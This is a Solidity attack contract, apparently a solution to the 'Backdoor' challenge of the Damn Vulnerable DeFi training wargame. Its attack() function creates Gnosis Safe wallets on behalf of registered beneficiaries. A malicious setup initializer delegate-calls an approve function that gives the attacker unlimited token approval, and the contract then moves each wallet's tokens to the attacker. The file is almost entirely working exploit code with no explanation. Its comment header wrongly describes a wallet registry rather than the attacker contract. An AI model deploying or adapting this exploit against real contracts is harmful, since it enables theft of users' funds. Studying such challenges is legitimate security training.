// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

interface IWalletRegistry {
    function addBeneficiary(address beneficiary) external;

    function proxyCreated(
        GnosisSafeProxy proxy,
        address singleton,
        bytes calldata initializer,
        uint256
    ) external;
}

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

interface IGnosisSafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
 *            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract BackdoorAttacker {
    address[] beneficiaries;
    IERC20 immutable token;
    IGnosisSafeProxyFactory immutable factory;
    IGnosisSafe immutable safe;
    IWalletRegistry immutable registry;
    address attacker;

    constructor(
        address _token,
        address _factory,
        address _safe,
        address _registry,
        address[] memory _beneficiaries
    ) {
        attacker = msg.sender;
        token = IERC20(_token);
        factory = IGnosisSafeProxyFactory(_factory);
        safe = IGnosisSafe(_safe);
        registry = IWalletRegistry(_registry);
        beneficiaries = _beneficiaries;
    }

    function attack() external {
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];
            bytes memory data = abi.encodeWithSignature(
                ("approveWrapper(address,address)"),
                address(token),
                address(this)
            );

            bytes memory initializer = abi.encodeWithSelector(
                safe.setup.selector,
                owners,
                1,
                address(this),
                data,
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                address(safe),
                initializer,
                i,
                IProxyCreationCallback(address(registry))
            );
            token.transferFrom(address(proxy), attacker, 10 ether);
        }
    }

    function approveWrapper(address _token, address _attacker) external {
        IERC20(_token).approve(_attacker, type(uint256).max);
    }
}
